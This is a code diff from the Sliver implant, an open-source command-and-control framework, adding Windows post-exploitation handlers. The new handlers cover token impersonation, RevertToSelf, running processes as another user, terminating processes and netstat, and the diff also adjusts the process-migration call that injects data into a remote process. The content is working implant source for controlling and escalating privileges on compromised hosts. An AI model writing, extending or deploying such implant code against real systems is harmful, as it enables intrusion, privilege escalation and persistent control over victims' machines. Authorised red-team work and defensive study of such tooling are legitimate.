@@ -28,6 +28,7 @@ import (
 	"github.com/bishopfox/sliver/sliver/taskrunner"
 
 	"github.com/golang/protobuf/proto"
+	"golang.org/x/sys/windows"
 )
 
 var (
@@ -37,6 +38,8 @@ var (
 		pb.MsgRemoteTask:         remoteTaskHandler,
 		pb.MsgProcessDumpReq:     dumpHandler,
 		pb.MsgImpersonateReq:     impersonateHandler,
+		pb.MsgRevToSelf:          revToSelfHandler,
+		pb.MsgRunAs:              runAsHandler,
 		pb.MsgGetSystemReq:       getsystemHandler,
 		pb.MsgElevateReq:         elevateHandler,
 		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
@@ -46,6 +49,7 @@ var (
 
 		// Generic
 		pb.MsgPsReq:       psHandler,
+		pb.MsgTerminate:   terminateHandler,
 		pb.MsgPing:        pingHandler,
 		pb.MsgLsReq:       dirListHandler,
 		pb.MsgDownloadReq: downloadHandler,
@@ -56,6 +60,7 @@ var (
 		pb.MsgMkdirReq:    mkdirHandler,
 		pb.MsgIfconfigReq: ifconfigHandler,
 		pb.MsgExecuteReq:  executeHandler,
+		pb.MsgNetstatReq:  netstatHandler,
 	}
 )
 
@@ -66,6 +71,7 @@ func GetSystemHandlers() map[uint32]RPCHandler {
 // ---------------- Windows Handlers ----------------
 
 func impersonateHandler(data []byte, resp RPCResponse) {
+	var errStr string
 	impersonateReq := &pb.ImpersonateReq{}
 	err := proto.Unmarshal(data, impersonateReq)
 	if err != nil {
@@ -74,15 +80,58 @@ func impersonateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	out, err := priv.RunProcessAsUser(impersonateReq.Username, impersonateReq.Process, impersonateReq.Args)
+	token, err := priv.Impersonate(impersonateReq.Username)
 	if err != nil {
-		resp([]byte{}, err)
-		return
+		errStr = err.Error()
+	} else {
+		taskrunner.CurrentToken = token
 	}
 	impersonate := &pb.Impersonate{
-		Output: out,
+		Err: errStr,
 	}
 	data, err = proto.Marshal(impersonate)
+	resp(data, err)
+}
+
+func runAsHandler(data []byte, resp RPCResponse) {
+	var errStr string
+	runAsReq := &pb.RunAsReq{}
+	err := proto.Unmarshal(data, runAsReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	out, err := priv.RunProcessAsUser(runAsReq.Username, runAsReq.Process, runAsReq.Args)
+	if err != nil {
+		errStr = err.Error()
+	}
+	runAs := &pb.RunAs{
+		Output: out,
+		Err:    errStr,
+	}
+	data, err = proto.Marshal(runAs)
+	resp(data, err)
+}
+
+func revToSelfHandler(_ []byte, resp RPCResponse) {
+	var errStr string
+	//{{if .Debug}}
+	log.Println("Calling revToSelf...")
+	//{{end}}
+	taskrunner.CurrentToken = windows.Token(0)
+	err := priv.RevertToSelf()
+	if err != nil {
+		errStr = err.Error()
+	}
+	revToSelfResp := &pb.RevToSelf{
+		Err: errStr,
+	}
+	//{{if .Debug}}
+	log.Println("revToSelf done!")
+	//{{end}}
+	data, err := proto.Marshal(revToSelfResp)
 	resp(data, err)
 }
 
@@ -164,7 +213,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Shellcode, false)
+	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
 	// {{if .Debug}}
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
